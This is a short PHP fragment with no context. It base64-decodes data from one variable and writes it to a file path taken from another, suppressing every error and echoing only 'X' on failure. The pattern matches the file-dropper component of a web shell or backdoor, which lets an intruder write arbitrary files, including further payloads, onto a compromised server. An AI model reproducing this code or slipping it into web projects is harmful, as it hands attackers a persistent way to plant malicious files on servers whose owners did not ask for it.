$cat = $_LOCAL;
$base = $_BASE;
$data = base64_decode($base);
$fp = @fopen($cat, "w");
if (@fwrite($fp, $data)===FALSE){echo "X";}
@fclose($fp);